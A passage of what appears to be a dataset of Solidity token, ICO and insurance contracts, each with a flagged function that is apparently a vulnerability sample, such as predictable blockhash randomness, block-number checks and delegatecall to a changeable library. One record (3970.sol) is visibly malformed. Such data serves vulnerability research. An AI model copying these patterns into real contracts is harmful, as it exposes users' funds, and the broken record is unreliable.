}\n}\ncontract IXTPaymentContract is Ownable, EmergencySafe, Upgradeable{\n event IXTPayment(address indexed from, address indexed to, uint value, string indexed action);\n ERC20Interface public tokenContract;\n mapping(string => uint) private actionPrices;\n mapping(address => bool) private allowed;\n modifier allowedOnly() {\n require(allowed[msg.sender] || msg.sender == owner);\n _;\n }\n function IXTPaymentContract(address tokenAddress) public {\n tokenContract = ERC20Interface(tokenAddress);\n allowed[owner] = true;\n }\n function transferIXT(address from, address to, string action) public allowedOnly isNotPaused returns (bool) {\n if (isOldVersion) {\n IXTPaymentContract newContract = IXTPaymentContract(nextContract);\n return newContract.transferIXT(from, to, action);\n } else {\n uint price = actionPrices[action];\n if(price != 0 && !tokenContract.transferFrom(from, to, price)){\n return false;\n } else {\n emit IXTPayment(from, to, price, action);\n return true;\n }\n }\n }\n function setTokenAddress(address erc20Token) public ownerOnly isNotPaused {\n tokenContract = ERC20Interface(erc20Token);\n }\n function setAction(string action, uint price) public ownerOnly isNotPaused {\n actionPrices[action] = price;\n }\n function getActionPrice(string action) public view returns (uint) {\n return actionPrices[action];\n }\n function setAllowed(address allowedAddress) public ownerOnly {\n allowed[allowedAddress] = true;\n }\n function removeAllowed(address allowedAddress) public ownerOnly {\n allowed[allowedAddress] = false;\n }\n}\ncontract Policy is Ownable, EmergencySafe, Upgradeable{\n struct InsuranceProduct {\n uint inceptionDate;\n string insuranceType;\n }\n struct PolicyInfo {\n uint blockNumber;\n uint numInsuranceProducts;\n string clientName;\n string ixlEnquiryId;\n string status;\n }\n InsuranceProduct[] public insuranceProducts;\n PolicyInfo public policyInfo;\n address private brokerEtherAddress;\n address private clientEtherAddress;\n mapping(address => bool) private cancellations;\n modifier participantOnly() {\n require(msg.sender == clientEtherAddress || msg.sender == brokerEtherAddress);\n _;\n }\n function Policy(string _clientName, address _brokerEtherAddress, address _clientEtherAddress, string _enquiryId) public {\n policyInfo = PolicyInfo({\n blockNumber: block.number,\n numInsuranceProducts: 0,\n clientName: _clientName,\n ixlEnquiryId: _enquiryId,\n status: 'In Force'\n });\n clientEtherAddress = _clientEtherAddress;\n brokerEtherAddress = _brokerEtherAddress;\n allowedToUpgrade = false;\n }\n function addInsuranceProduct (uint _inceptionDate, string _insuranceType) public ownerOnly isNotPaused {\n insuranceProducts.push(InsuranceProduct({\n inceptionDate: _inceptionDate,\n insuranceType: _insuranceType\n }));\n policyInfo.numInsuranceProducts++;\n }\n function revokeContract() public participantOnly {\n cancellations[msg.sender] = true;\n if (((cancellations[brokerEtherAddress] && (cancellations[clientEtherAddress] || cancellations[owner]))\n || (cancellations[clientEtherAddress] && cancellations[owner]))){\n policyInfo.status = \"REVOKED\";\n allowedToUpgrade = true;\n }\n }\n}\ncontract PolicyRegistry is Ownable, EmergencySafe, Upgradeable{\n event PolicyCreated(address at, address by);\n IXTPaymentContract public IXTPayment;\n mapping (address => address[]) private policiesByParticipant;\n address[] private policies;\n function PolicyRegistry(address paymentAddress) public {\n IXTPayment = IXTPaymentContract(paymentAddress);\n }\n function createContract(string _clientName, address _brokerEtherAddress, address _clientEtherAddress, string _enquiryId) public isNotPaused {\n Policy policy = new Policy(_clientName, _brokerEtherAddress, _clientEtherAddress, _enquiryId);\n policy.changeOwner(msg.sender);\n policiesByParticipant[_brokerEtherAddress].push(policy);\n if (_clientEtherAddress != _brokerEtherAddress) {\n policiesByParticipant[_clientEtherAddress].push(policy);\n }\n if (msg.sender != _clientEtherAddress && msg.sender != _brokerEtherAddress) {\n policiesByParticipant[msg.sender].push(policy);\n }\n policies.push(policy);\n IXTPayment.transferIXT(_clientEtherAddress, owner, \"create_insurance\");\n emit PolicyCreated(policy, msg.sender);\n }\n function getMyPolicies() public view returns (address[]) {\n return policiesByParticipant[msg.sender];\n }\n function getAllPolicies() public view ownerOnly returns (address[]){\n return policies;\n }\n function changePaymentContract(address contractAddress) public ownerOnly{\n IXTPayment = IXTPaymentContract(contractAddress);\n }\n}",
  "extract_feature": [
    "function Policy(string _clientName, address _brokerEtherAddress, address _clientEtherAddress, string _enquiryId) public {\npolicyInfo = PolicyInfo({\nblockNumber: block.number,\nnumInsuranceProducts: 0,\nclientName: _clientName,\nixlEnquiryId: _enquiryId,\nstatus: 'In Force'\n});\nclientEtherAddress = _clientEtherAddress;\nbrokerEtherAddress = _brokerEtherAddress;\nallowedToUpgrade = false;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b83"
  },
  "filename": "3945.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract KanadeCoin is StandardToken, Ownable {\n using SafeMath for uint256;\n struct VoteStruct {\n uint128 number;\n uint256 amount;\n address from;\n uint128 time;\n }\n struct QuestionStruct {\n uint8 isStarted;\n address recipient;\n uint128 finish;\n uint under;\n VoteStruct[] votes;\n }\n struct RandomBoxStruct {\n uint8 isStarted;\n address recipient;\n uint64 volume;\n uint256 amount;\n uint128 finish;\n }\n struct RandomItemStruct {\n mapping(bytes32 => uint256[]) values;\n }\n address public constant addrDevTeam = 0x4d85FCF252c02FA849258f16c5464aF529ebFA5F;\n address public constant addrLockUp = 0x0101010101010101010101010101010101010101;\n address public constant addrBounty = 0x3CCDb82F43EEF681A39AE854Be37ad1C40446F0d;\n address public constant addrDistribution = 0x9D6FB734a716306a9575E3ce971AB8839eDcEdF3;\n address public constant addrAirDrop = 0xD6A4ce07f18619Ec73f91CcDbefcCE53f048AE05;\n uint public constant atto = 100000000;\n uint public constant decimals = 8;\n string public constant name = \"KanadeCoin\";\n string public constant symbol = \"KNDC\";\n uint public contractStartTime;\n uint64 public constant lockupSeconds = 60 * 60 * 24 * 365 * 3;\n mapping(bytes32 => QuestionStruct) questions;\n mapping(address => string) saveData;\n mapping(bytes32 => RandomBoxStruct) randomBoxes;\n mapping(address => RandomItemStruct) randomItems;\n constructor() public {\n }\n function initializeContract() onlyOwner public {\n if (totalSupply_ != 0) return;\n contractStartTime = now;\n balances[addrDevTeam] = 10000000000 * 0.01 * atto;\n balances[addrLockUp] = 10000000000 * 0.09 * atto;\n balances[addrBounty] = 10000000000 * 0.25 * atto;\n balances[addrDistribution] = 10000000000 * 0.10 * atto;\n balances[addrAirDrop] = 10000000000 * 0.55 * atto;\n Transfer(0x0, addrDevTeam, balances[addrDevTeam]);\n Transfer(0x0, addrLockUp, balances[addrLockUp]);\n Transfer(0x0, addrBounty, balances[addrBounty]);\n Transfer(0x0, addrDistribution, balances[addrDistribution]);\n Transfer(0x0, addrAirDrop, balances[addrAirDrop]);\n totalSupply_ = 10000000000 * atto;\n }\n function unLockup() onlyOwner public {\n require(uint256(now).sub(lockupSeconds) > contractStartTime);\n uint _amount = balances[addrLockUp];\n balances[addrLockUp] = balances[addrLockUp].sub(_amount);\n balances[addrDevTeam] = balances[addrDevTeam].add(_amount);\n Transfer(addrLockUp, addrDevTeam, _amount);\n }\n function createQuestion(string _id_max32, address _recipient, uint128 _finish, uint _under) public {\n bytes32 _idByte = keccak256(_id_max32);\n require(questions[_idByte].isStarted == 0);\n transfer(addrBounty, 5000 * atto);\n questions[_idByte].isStarted = 1;\n questions[_idByte].recipient = _recipient;\n questions[_idByte].finish = _finish;\n questions[_idByte].under = _under;\n }\n function getQuestion(string _id_max32) constant public returns (uint[4]) {\n bytes32 _idByte = keccak256(_id_max32);\n uint[4] values;\n values[0] = questions[_idByte].isStarted;\n values[1] = uint(questions[_idByte].recipient);\n values[2] = questions[_idByte].finish;\n values[3] = questions[_idByte].under;\n return values;\n }\n function vote(string _id_max32, uint128 _number, uint _amount) public {\n bytes32 _idByte = keccak256(_id_max32);\n require(\n questions[_idByte].isStarted == 1 &&\n questions[_idByte].under <= _amount &&\n questions[_idByte].finish >= uint128(now));\n if (_amount > 0) {\n transfer(questions[_idByte].recipient, _amount);\n }\n questions[_idByte].votes.push(VoteStruct(_number, _amount, msg.sender, uint128(now)));\n }\n function getQuestionVotesAllCount(string _id_max32) constant public returns (uint) {\n return questions[keccak256(_id_max32)].votes.length;\n }\n function getQuestionVote(string _id_max32, uint _position) constant public returns (uint[4]) {\n bytes32 _idByte = keccak256(_id_max32);\n uint[4] values;\n values[0] = questions[_idByte].votes[_position].number;\n values[1] = questions[_idByte].votes[_position].amount;\n values[2] = uint(questions[_idByte].votes[_position].from);\n values[3] = questions[_idByte].votes[_position].time;\n return values;\n }\n function putSaveData(string _text) public {\n saveData[msg.sender] = _text;\n }\n function getSaveData(address _address) constant public returns (string) {\n return saveData[_address];\n }\n function createRandomBox(string _id_max32, address _recipient, uint64 _volume, uint256 _amount, uint128 _finish) public {\n require(_volume > 0);\n bytes32 _idByte = keccak256(_id_max32);\n require(randomBoxes[_idByte].isStarted == 0);\n transfer(addrBounty, 5000 * atto);\n randomBoxes[_idByte].isStarted = 1;\n randomBoxes[_idByte].recipient = _recipient;\n randomBoxes[_idByte].volume = _volume;\n randomBoxes[_idByte].amount = _amount;\n randomBoxes[_idByte].finish = _finish;\n }\n function getRandomBox(string _id_max32) constant public returns (uint[5]) {\n bytes32 _idByte = keccak256(_id_max32);\n uint[5] values;\n values[0] = randomBoxes[_idByte].isStarted;\n values[1] = uint(randomBoxes[_idByte].recipient);\n values[2] = randomBoxes[_idByte].volume;\n values[3] = randomBoxes[_idByte].amount;\n values[4] = randomBoxes[_idByte].finish;\n return values;\n }\n function drawRandomItem(string _id_max32, uint _count) public {\n require(_count > 0 && _count <= 1000);\n bytes32 _idByte = keccak256(_id_max32);\n uint _totalAmount = randomBoxes[_idByte].amount.mul(_count);\n require(\n randomBoxes[_idByte].isStarted == 1 &&\n randomBoxes[_idByte].finish >= uint128(now));\n transfer(randomBoxes[_idByte].recipient, _totalAmount);\n for (uint i = 0; i < _count; i++) {\n uint randomVal = uint(\n keccak256(blockhash(block.number-1), randomItems[msg.sender].values[_idByte].length))\n % randomBoxes[_idByte].volume;\n randomItems[msg.sender].values[_idByte].push(randomVal);\n }\n }\n function getRandomItems(address _addrss, string _id_max32) constant public returns (uint[]) {\n return randomItems[_addrss].values[keccak256(_id_max32)];\n }\n function airDrop(address[] _recipients, uint[] _values) onlyOwner public returns (bool) {\n return distribute(addrAirDrop, _recipients, _values);\n }\n function rain(address[] _recipients, uint[] _values) public returns (bool) {\n return distribute(msg.sender, _recipients, _values);\n }\n function distribute(address _from, address[] _recipients, uint[] _values) internal returns (bool) {\n require(_recipients.length > 0 && _recipients.length == _values.length);\n uint total = 0;\n for(uint i = 0; i < _values.length; i++) {\n total = total.add(_values[i]);\n }\n require(total <= balances[_from]);\n for(uint j = 0; j < _recipients.length; j++) {\n balances[_recipients[j]] = balances[_recipients[j]].add(_values[j]);\n Transfer(_from, _recipients[j], _values[j]);\n }\n balances[_from] = balances[_from].sub(total);\n return true;\n }\n}",
  "extract_feature": [
    "function drawRandomItem(string _id_max32, uint _count) public {\nrequire(_count > 0 && _count <= 1000);\nbytes32 _idByte = keccak256(_id_max32);\nuint _totalAmount = randomBoxes[_idByte].amount.mul(_count);\nrequire(\nrandomBoxes[_idByte].isStarted == 1 &&\nrandomBoxes[_idByte].finish >= uint128(now));\ntransfer(randomBoxes[_idByte].recipient, _totalAmount);\nfor (uint i = 0; i < _count; i++) {\nuint randomVal = uint(\nkeccak256(blockhash(block.number-1), randomItems[msg.sender].values[_idByte].length))\n% randomBoxes[_idByte].volume;\nrandomItems[msg.sender].values[_idByte].push(randomVal);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b84"
  },
  "filename": "3955.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b85"
  },
  "filename": "3970.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 xxc) returns (bool success);\n}\ncontract SafeMath {\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract XinXianToken is StandardToken, SafeMath {\n string public constant name = \"XinXian\";\n string public constant symbol = \"XXC\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 625;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function XinXianToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1000000000);\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b86"
  },
  "filename": "3971.sol",
  "content": "pragma solidity 0.4.24;\ncontract Owned {\n address public owner = msg.sender;\n constructor(address _owner) public {\n if ( _owner == 0x00 ) {\n _owner = msg.sender;\n }\n owner = _owner;\n }\n function replaceOwner(address _owner) external returns(bool) {\n require( isOwner() );\n owner = _owner;\n return true;\n }\n function isOwner() internal view returns(bool) {\n return owner == msg.sender;\n }\n modifier forOwner {\n require( isOwner() );\n _;\n }\n}\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a + b;\n assert( c >= a );\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a - b;\n assert( c <= a );\n return c;\n }\n function mul(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a * b;\n assert( c == 0 || c / a == b );\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns(uint256) {\n return a / b;\n }\n function pow(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a ** b;\n assert( c % a == 0 );\n return a ** b;\n }\n}\ncontract TokenDB is Owned {\n function transfer(address _from, address _to, uint256 _amount) external returns(bool _success) {}\n function bulkTransfer(address _from, address[] _to, uint256[] _amount) external returns(bool _success) {}\n function setAllowance(address _owner, address _spender, uint256 _amount) external returns(bool _success) {}\n function getAllowance(address _owner, address _spender) public view returns(bool _success, uint256 _remaining) {}\n function balanceOf(address _owner) public view returns(bool _success, uint256 _balance) {}\n}\ncontract Token is Owned {\n using SafeMath for uint256;\n string public name = \"Inlock token\";\n string public symbol = \"ILK\";\n uint8 public decimals = 8;\n uint256 public totalSupply = 44e16;\n address public libAddress;\n TokenDB public db;\n Ico public ico;\n function () public { revert(); }\n function changeLibAddress(address _libAddress) external forOwner {}\n function changeDBAddress(address _dbAddress) external forOwner {}\n function changeIcoAddress(address _icoAddress) external forOwner {}\n function approve(address _spender, uint256 _value) external returns (bool _success) {}\n function transfer(address _to, uint256 _amount) external returns (bool _success) {}\n function bulkTransfer(address[] _to, uint256[] _amount) external returns (bool _success) {}\n function transferFrom(address _from, address _to, uint256 _amount) external returns (bool _success) {}\n function allowance(address _owner, address _spender) public view returns (uint256 _remaining) {}\n function balanceOf(address _owner) public view returns (uint256 _balance) {}\n event AllowanceUsed(address indexed _spender, address indexed _owner, uint256 indexed _value);\n event Mint(address indexed _addr, uint256 indexed _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n}\ncontract Ico is Owned {\n using SafeMath for uint256;\n enum phaseType {\n pause,\n privateSale1,\n privateSale2,\n sales1,\n sales2,\n sales3,\n sales4,\n preFinish,\n finish\n }\n struct vesting_s {\n uint256 amount;\n uint256 startBlock;\n uint256 endBlock;\n uint256 claimedAmount;\n }\n mapping(address => bool) public KYC;\n mapping(address => bool) public transferRight;\n mapping(address => vesting_s) public vesting;\n phaseType public currentPhase;\n uint256 public currentRate;\n uint256 public currentRateM = 1e3;\n uint256 public privateSale1Hardcap = 4e16;\n uint256 public privateSale2Hardcap = 64e15;\n uint256 public thisBalance = 44e16;\n address public offchainUploaderAddress;\n address public setKYCAddress;\n address public setRateAddress;\n address public libAddress;\n Token public token;\n constructor(address _owner, address _libAddress, address _tokenAddress, address _offchainUploaderAddress,\n address _setKYCAddress, address _setRateAddress) Owned(_owner) public {\n currentPhase = phaseType.pause;\n libAddress = _libAddress;\n token = Token(_tokenAddress);\n offchainUploaderAddress = _offchainUploaderAddress;\n setKYCAddress = _setKYCAddress;\n setRateAddress = _setRateAddress;\n }\n function () public payable {\n buy();\n }\n function changeLibAddress(address _libAddress) external forOwner {\n libAddress = _libAddress;\n }\n function changeOffchainUploaderAddress(address _offchainUploaderAddress) external forOwner {\n offchainUploaderAddress = _offchainUploaderAddress;\n }\n function changeKYCAddress(address _setKYCAddress) external forOwner {\n setKYCAddress = _setKYCAddress;\n }\n function changeSetRateAddress(address _setRateAddress) external forOwner {\n setRateAddress = _setRateAddress;\n }\n function setVesting(address _beneficiary, uint256 _amount, uint256 _startBlock, uint256 _endBlock) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function claimVesting() external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setKYC(address[] _on, address[] _off) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setTransferRight(address[] _allow, address[] _disallow) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setCurrentRate(uint256 _currentRate) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setCurrentPhase(phaseType _phase) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function offchainUpload(address[] _beneficiaries, uint256[] 